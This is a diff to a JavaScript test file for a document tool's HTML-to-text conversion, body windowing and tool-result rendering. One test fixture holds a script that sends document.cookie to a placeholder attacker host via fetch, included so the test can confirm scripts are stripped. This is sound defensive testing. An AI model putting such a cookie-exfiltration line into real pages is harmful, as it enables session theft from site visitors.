@@ -23,6 +23,7 @@
 // Run: node tools/files-sim.mjs
 
 import {
+  BODY_MAX_CHARS,
   DEFAULT_AGENT,
   FILES_KIND,
   FILES_TOOL_ID,
@@ -34,6 +35,7 @@ import {
   LIST_MAX_PAGES,
   RESULT_CHARS,
   SANDBOX_CSP,
+  bodyWindow,
   compactDoc,
   compactList,
   createFilesClient,
@@ -41,9 +43,11 @@ import {
   filesConfig,
   filesToolSchema,
   htmlResponseHeaders,
+  htmlToText,
   isFilesTool,
   isHtmlish,
   normalizeBaseUrl,
+  renderToolBody,
   renderToolResult,
 } from '../../web/server/jarvis-files.mjs';
 import {
@@ -276,7 +280,16 @@ eq('the envelope is carried through', [page.total, page.hasMore, page.nextOffset
 eq('count stands in for total when absent', compactList({ items: [], count: 7 }).total, 7);
 
 // ── 4. renderToolResult — what the MODEL reads ──────────────────────────────
-console.log('\n§4  renderToolResult never carries a body');
+//
+// TWO INVARIANTS, NOT ONE. A metadata call is a short plain-text summary and
+// carries NO body — that is unchanged and still asserted below. A read that
+// ASKED for the body gets its TEXT (htmlToText + bodyWindow + renderToolBody,
+// tested at the end of this section) — the WHOLE page whenever it fits, because
+// a page the reader cannot see the end of is a page it cannot rewrite, and only
+// a document past the ceiling in slices. What must never happen in either case
+// is markup reaching a tool message, or a body larger than that one ceiling,
+// and those are the last assertions in this section.
+console.log('\n§4  a result is plain text: metadata by default, the WHOLE page on request');
 const listed = renderToolResult('list_sessions', page);
 has('a list is numbered', listed, '1. Weekly report [analyst]');
 has('…with the id, so the model can act on it', listed, 'a'.repeat(32));
@@ -305,6 +318,172 @@ const huge = renderToolResult('list_sessions', {
 });
 assert('a huge list is clipped to the result budget', huge.length <= RESULT_CHARS + 1, String(huge.length));
 assert('…and says it was clipped', huge.endsWith('…'));
+assert('a metadata read still carries NO body', !renderToolResult('read_session', doc).includes('the whole document'));
+
+// htmlToText — the body as the WORDS it renders.
+//
+// The order of the rewrites is the whole test: tags go before entities, so text
+// that SAYS `<script>` survives as text, and a stray `&` in prose cannot eat the
+// sentence after it.
+{
+  const body = [
+    '<!doctype html><html><head><style>body{color:red;font-size:900px}</style></head>',
+    '<body><h1>Weekly report</h1>',
+    '<p>Revenue &amp; costs rose&nbsp;4&#37;.</p>',
+    '<script>fetch("https://evil.example/x?y=" + document.cookie)</script>',
+    '<p>The literal text &lt;script&gt; is not markup.</p>',
+    '<table><tr><td>north</td><td>south</td></tr></table>',
+    '<!-- editorial note that must not reach a model -->',
+    '<pre>a &gt; b</pre>',
+    '<p>Inline <b>bold</b> and <code>code</code> stay in the sentence.</p>',
+    '</body></html>',
+  ].join('\n');
+  const text = htmlToText(body);
+
+  lacks('a <script> RUNS nowhere: its code is gone', text, 'document.cookie');
+  lacks('…and a stylesheet is gone', text, 'font-size');
+  lacks('…and so is an HTML comment', text, 'editorial note');
+  has('the prose is kept', text, 'Weekly report');
+  has('entities decode: &amp;', text, 'Revenue & costs rose 4%.');
+  assert(
+    'block tags separate lines, never weld two words',
+    /north\n+south/.test(text),
+    JSON.stringify(text.slice(text.indexOf('north') - 1, text.indexOf('south') + 6)),
+  );
+  lacks('…so a table never collapses into "northsouth"', text, 'northsouth');
+  has('escaped markup stays TEXT, not markup', text, 'The literal text <script> is not markup.');
+  has('an inline tag vanishes without eating the word', text, 'Inline bold and code stay in the sentence.');
+  has('a pre block keeps its decoded operator', text, 'a > b');
+  assert('no markup survives at all', !/<[a-z!/]/i.test(text.replace('<script>', '')), JSON.stringify(text.slice(0, 60)));
+  eq('undefined is an empty string, not a crash', htmlToText(undefined), '');
+  eq('whitespace is collapsed to at most one blank line', htmlToText('<p>a</p>\n\n\n\n<p>b</p>'), 'a\n\nb');
+  eq('an unknown entity is left as written', htmlToText('<p>a &bogus; b</p>'), 'a &bogus; b');
+  eq('a lone & is not a reference', htmlToText('<p>Tom & Jerry</p>'), 'Tom & Jerry');
+  eq('a control-character reference becomes a space', htmlToText('<p>a&#1;b</p>'), 'a b');
+  eq('…and so does a lone surrogate', htmlToText('<p>a&#xD800;b</p>'), 'a b');
+  eq('a NUL reference is not a character, so it is left as written', htmlToText('<p>a&#0;b</p>'), 'a&#0;b');
+}
+
+// bodyWindow — the WHOLE text by default, and one offset per slice when a
+// document is genuinely too long for a single message.
+{
+  // A page that fits. This is the ordinary read — the one that names no size —
+  // and it must come back complete, end included: reading is not sampling, and
+  // a page whose ending the model cannot see is a page it cannot rewrite.
+  const brief = Array.from({ length: 5000 }, (_, i) => `word${i}`).join(' ');
+  assert('the brief fixture fits the ceiling', brief.length < BODY_MAX_CHARS, String(brief.length));
+  const whole = bodyWindow(brief);
+  eq('a read that names no size gets the WHOLE text', whole.text, brief);
+  eq('…starting at 0 when no offset is given', whole.offset, 0);
+  eq('…with no next offset to chase', whole.next, null);
+  assert('…and nothing more to fetch', !whole.more);
+  eq('…so the last characters of the document are in the message', whole.text.slice(-5), brief.slice(-5));
+
+  const short = bodyWindow('all of it');
+  eq('a short text is the whole window', short.text, 'all of it');
+  eq('…with no next offset', short.next, null);
+  assert('…and no more flag', !short.more);
+
+  // A document longer than one message: the ONLY thing that produces a slice.
+  const long = 'paragraph. '.repeat(8000);
+  assert('the long fixture is past the ceiling', long.length > BODY_MAX_CHARS, String(long.length));
+  const first = bodyWindow(long);
+  eq('a document past the ceiling is capped at it', first.text.length, BODY_MAX_CHARS);
+  eq('…and names where the next window starts', first.next, BODY_MAX_CHARS);
+  assert('…and says there is more', first.more);
+
+  // THE INVARIANT THAT MATTERS: walking the windows must reproduce the text
+  // byte for byte. An off-by-one in the window arithmetic shows up here as a
+  // dropped or repeated character, and NOWHERE else in this suite.
+  let walked = '';
+  let at = 0;
+  let guard = 0;
+  for (;;) {
+    const w = bodyWindow(long, { offset: at });
+    walked += w.text;
+    if (!w.more) break;
+    at = w.next;
+    if ((guard += 1) > 100) break;
+  }
+  eq('walking the windows reproduces the whole text', walked, long);
+  assert(
+    '…and ends on a PARTIAL final window',
+    at > 0 && at < long.length && at + BODY_MAX_CHARS >= long.length,
+    `${at}/${long.length}`,
+  );
+
+  // A negative offset is the slice(-1) trap: -1 would select the LAST character
+  // and report a long document as one character long.
+  eq('a negative offset reads from the START', bodyWindow(long, { offset: -1 }).offset, 0);
+  eq('…and not from the end', bodyWindow('abcdef', { offset: -1 }).text, 'abcdef');
+  eq('a fractional offset is floored', bodyWindow('abcdef', { offset: 2.9 }).offset, 2);
+  eq('…so the slice starts where it says', bodyWindow('abcdef', { offset: 2.9 }).text, 'cdef');
+  for (const bad of [undefined, null, NaN, Infinity, 'abc', {}]) {
+    eq(`an unusable offset (${String(bad)}) reads from the start`, bodyWindow('abcdef', { offset: bad }).offset, 0);
+  }
+  const past = bodyWindow('abcdef', { offset: 99 });
+  eq('an offset past the end returns an EMPTY window, not a wrong one', past.text, '');
+  eq('…with the true length, so the caller can say what happened', past.total, 6);
+  eq('…and no next offset to chase', past.next, null);
+
+  eq('a caller-asked limit is honoured', bodyWindow(long, { limit: 1000 }).text.length, 1000);
+  eq('…and capped at the ceiling', bodyWindow(long, { limit: 10 ** 9 }).text.length, BODY_MAX_CHARS);
+  // An unusable size is NOT the smallest window: it is no limit at all, because
+  // a caller that asked badly did not ask for LESS than the whole page.
+  for (const bad of [0, -5, undefined, null, '', NaN, 'wide', {}]) {
+    eq(`an unusable limit (${String(bad)}) means the whole text`, bodyWindow(brief, { limit: bad }).text, brief);
+  }
+  eq('an empty body is an empty window, not a throw', bodyWindow(undefined).total, 0);
+}
+
+// renderToolBody — the ONLY way a body reaches a model, and its bounds.
+{
+  // Big enough to need two calls: 84 000 characters of text.
+  const article = `<!doctype html><h1>Quarterly review</h1><p>${'detail '.repeat(12000)}</p>`;
+  const read = { ...doc, html: article, size: Buffer.byteLength(article, 'utf8') };
+  const out = renderToolBody(read);
+  has('the head still names the document', out, 'Weekly report');
+  has('…and its version', out, 'v3');
+  has('…and the body text is there to read', out, 'detail detail');
+  lacks('…and NO markup came with it', out, '<h1>');
+  has('a truncated read ends with the offset to continue from', out, `offset ${BODY_MAX_CHARS}`);
+  assert('…and the whole message stays inside the body budget', out.length <= BODY_MAX_CHARS + 400, String(out.length));
+  // THE BYTE-BUDGET GUARD, and the reason a ceiling exists at all: a 4 MiB
+  // document must not become a 4 MiB tool message.
+  const maxed = renderToolBody({ ...read, html: `<p>${'x'.repeat(MAX_HTML_BYTES - 1)}</p>`, size: MAX_HTML_BYTES });
+  assert('a 4 MiB document does NOT become a 4 MiB tool message', maxed.length <= BODY_MAX_CHARS + 400, String(maxed.length));
+
+  // The end-of-document signal: docs.read relies on it and so does this, so a
+  // complete read must not carry the marker.
+  const whole = renderToolBody({ ...doc, html: '<h1>T</h1><p>short and complete</p>' });
+  lacks('a complete read carries NO truncation marker', whole, 'truncated at');
+  eq('…and it is the entire text, a block per line', whole.split('\n').slice(1).join('\n'), 'T\n\nshort and complete');
+
+  // THE CASE THIS WAS BUILT FOR. A report of the size actually stored in the
+  // library (28 000 characters of prose, against a real one measured at 17 912)
+  // must arrive in ONE message, complete, so the model can quote it or send it
+  // back rewritten. A sample it cannot see the end of is not enough to edit.
+  const report = renderToolBody({ ...doc, html: `<h1>Report</h1><p>${'detail '.repeat(4000)}</p>` });
+  lacks('a report-sized page comes back WHOLE, not as a sample', report, 'truncated at');
+  has('…with its first words present', report, 'detail detail');
+  assert('…and its last words too, so the ending is not lost', report.length > 28000, String(report.length));
+
+  // The two answers that would otherwise be an empty body — i.e. "the page is
+  // blank" — which is the one wrong answer that looks successful.
+  const markupOnly = renderToolBody({ ...doc, html: '<svg><path d="M0 0"/></svg>' });
+  has('a document with no prose SAYS so', markupOnly, 'no readable text');
+  assert(
+    '…and never hands back whitespace that reads as a successful blank page',
+    markupOnly.split('\n').pop().trim().length > 20,
+    JSON.stringify(markupOnly.split('\n').pop()),
+  );
+  const past = renderToolBody({ ...doc, html: '<p>abcdef</p>' }, { offset: 99 });
+  has('an offset past the end SAYS so', past, 'past the end');
+  has('…and names the real length', past, '6 characters');
+  const unfetched = renderToolBody(doc);
+  has('a body that was never fetched SAYS that instead', unfetched, 'not fetched');
+  eq('no document at all still answers', renderToolBody(null).length > 0, true);
+}
 
 // ── 5. isHtmlish — the 422 guard ────────────────────────────────────────────
 console.log('\n§5  isHtmlish');
@@ -988,7 +1167,11 @@ console.log('\n§11  filesToolSchema');
     ],
   );
   eq('only the action is required', s.function.parameters.required, ['action']);
-  has('the description says the body is NOT returned', s.function.description, 'NOT returned');
+  has('the description says a body comes only when asked for', s.function.description, 'only when you ask for it with include_html');
+  has('…and the include_html parameter says how to get one', s.function.parameters.properties.include_html.description, 'call read again');
+  has('…and that the markup is never sent', s.function.parameters.properties.include_html.description, 'markup is never sent');
+  lacks('…and no longer tells the model that asking changes nothing', s.function.parameters.properties.include_html.description, 'Leave it false');
+  has('offset serves read as well as list now', s.function.parameters.properties.offset.description, 'read/revision');
   const custom = filesToolSchema({ name: 'my_files', description: 'custom' });
   eq('a tool-defined name wins', custom.function.name, 'my_files');
   eq('…and so does its description', custom.function.description, 'custom');
@@ -1006,6 +1189,9 @@ console.log('\n§12  the relay is wired to this module');
   has('…and the HTML proxy route exists', relay, '/api/files/');
   has('…including the body route', relay, '/html$');
   has('…and the media route', relay, '/media$');
+  has('…and the readable-text route the model reads through', relay, '/text$');
+  has('…converting off the module that owns the contract', relay, 'htmlToText(');
+  has('…and windowing off the same helper the tool path uses', relay, 'bodyWindow(');
   has('…extracting through the module that owns the document contract', relay, 'extractMedia(');
   has('…and status', relay, '/api/files/status');
   lacks('…with no gateway credential baked into the relay', relay, 'JARVIS_FILE_PWD=');
